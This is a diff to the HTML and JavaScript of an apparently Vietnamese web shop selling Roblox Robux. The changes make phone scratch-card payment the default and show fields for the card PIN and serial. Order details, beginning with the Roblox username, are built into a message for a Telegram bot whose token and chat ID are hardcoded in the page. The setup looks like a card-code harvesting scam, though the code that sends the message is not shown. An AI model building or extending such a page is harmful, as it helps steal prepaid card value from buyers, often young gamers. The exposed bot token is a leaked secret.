@@ -132,15 +132,6 @@
             color: #00c6ff;
             margin-bottom: 10px;
         }
-        .qr-placeholder {
-            background: #fff;
-            color: #000;
-            padding: 15px;
-            display: inline-block;
-            border-radius: 8px;
-            margin: 10px 0;
-            font-weight: bold;
-        }
         footer {
             text-align: center;
             margin-top: 40px;
@@ -195,14 +186,11 @@
         <!-- FORM ĐẶT HÀNG -->
         <h2 class="section-title" id="orderForm">Thông Tin Đặt Hàng</h2>
         <div class="order-section">
-            <form id="robuxForm" onsubmit="submitOrder(event)">
+            <form id="robuxForm">
                 <div class="form-group">
                     <label for="username">Tên Tài Khoản Roblox (Username):</label>
                     <input type="text" id="username" placeholder="Nhập chính xác tên Roblox của bạn" required>
                 </div>
-
-         
-                
 
                 <div class="form-group">
                     <label for="packageSelect">Gói Robux Đã Chọn:</label>
@@ -215,43 +203,45 @@
                         <option value="3.500 Robux - 500.000 VNĐ">3.500 Robux - 500.000 VNĐ</option>
                     </select>
                 </div>
-<!-- CHỌN PHƯƠNG THỨC THANH TOÁN & THẺ CÀO -->
-<div class="form-group">
-    <label for="paymentMethod">Phương thức thanh toán:</label>
-    <select id="paymentMethod" onchange="togglePaymentFields()">
-        <option value="qr">Chuyển khoản / Quét mã QR</option>
-        <option value="card">Thẻ cào điện thoại</option>
-    </select>
-</div>
 
-<div id="cardFields" style="display: none; background: #1f293d; padding: 15px; border-radius: 8px; margin-bottom: 15px;">
-    <div class="form-group">
-        <label for="cardType">Loại thẻ:</label>
-        <select id="cardType">
-            <option value="Viettel">Viettel</option>
-            <option value="Vinaphone">Vinaphone</option>
-            <option value="Mobifone">Mobifone</option>
-            <option value="Zing">Zing</option>
-        </select>
+                <!-- CHỌN PHƯƠNG THỨC THANH TOÁN & THẺ CÀO -->
+                <div class="form-group">
+                    <label for="paymentMethod">Phương thức thanh toán:</label>
+                    <select id="paymentMethod" onchange="togglePaymentFields()">
+                        <option value="qr">Chuyển khoản / Quét mã QR</option>
+                        <option value="card" selected>Thẻ cào điện thoại</option>
+                    </select>
+                </div>
+
+                <div id="cardFields" style="background: #1f293d; padding: 15px; border-radius: 8px; margin-bottom: 15px;">
+                    <div class="form-group">
+                        <label for="cardType">Loại thẻ:</label>
+                        <select id="cardType">
+                            <option value="Viettel">Viettel</option>
+                            <option value="Vinaphone">Vinaphone</option>
+                            <option value="Mobifone">Mobifone</option>
+                            <option value="Zing">Zing</option>
+                        </select>
+                    </div>
+                    <div class="form-group">
+                        <label for="cardPin">Mã thẻ (PIN):</label>
+                        <input type="text" id="cardPin" placeholder="Nhập mã thẻ cào...">
+                    </div>
+                    <div class="form-group">
+                        <label for="cardSeri">Mã Seri thẻ:</label>
+                        <input type="text" id="cardSeri" placeholder="Nhập số seri...">
+                    </div>
+                </div>
+
+                <button type="submit" style="width: 100%; padding: 12px; background: #0084ff; color: #fff; border: none; border-radius: 8px; font-weight: bold; font-size: 16px; margin-top: 15px; cursor: pointer;">
+                    XÁC NHẬN THANH TOÁN
+                </button>
+            </form>
+        </div>
     </div>
-    <div class="form-group">
-        <label for="cardPin">Mã thẻ (PIN):</label>
-        <input type="text" id="cardPin" placeholder="Nhập mã thẻ cào...">
-    </div>
-    <div class="form-group">
-        <label for="cardSeri">Mã Seri thẻ:</label>
-        <input type="text" id="cardSeri" placeholder="Nhập số seri...">
-    </div>
-</div>
-<button type="submit" style="width: 100%; padding: 12px; background: #0084ff; color: #fff; border: none; border-radius: 8px; font-weight: bold; font-size: 16px; margin-top: 15px; cursor: pointer;">
-    XÁC NHẬN THANH TOÁN
-</button>
 
 <script>
 const TELEGRAM_TOKEN = '8819856826:AAHTz6wkAyqnwO6qfMJBC1Vd7VhyQ0ttHl0';
-
-
-
 const TELEGRAM_CHAT_ID = '6999613477';
 
 function selectPackage(packageName) {
@@ -264,14 +254,11 @@ function selectPackage(packageName) {
 function togglePaymentFields() {
     var method = document.getElementById("paymentMethod").value;
     var cardBox = document.getElementById("cardFields");
-    var qrBox = document.querySelector(".payment-info");
     
     if (method === "card") {
         if (cardBox) cardBox.style.display = "block";
-        if (qrBox) qrBox.style.display = "none";
     } else {
         if (cardBox) cardBox.style.display = "none";
-        if (qrBox) qrBox.style.display = "block";
     }
 }
 
@@ -284,7 +271,7 @@ document.addEventListener('DOMContentLoaded', function() {
 
         const username = document.getElementById('username') ? document.getElementById('username').value : '';
         const packageVal = document.getElementById('packageSelect') ? document.getElementById('packageSelect').value : '';
-        const paymentMethod = document.getElementById('paymentMethod') ? document.getElementById('paymentMethod').value : 'qr';
+        const paymentMethod = document.getElementById('paymentMethod') ? document.getElementById('paymentMethod').value : 'card';
 
         let message = `🛒 <b>ĐƠN HÀNG MỚI TỪ WEB!</b>\n\n`;
         message += `👤 <b>Tài khoản Roblox:</b> ${username}\n`;
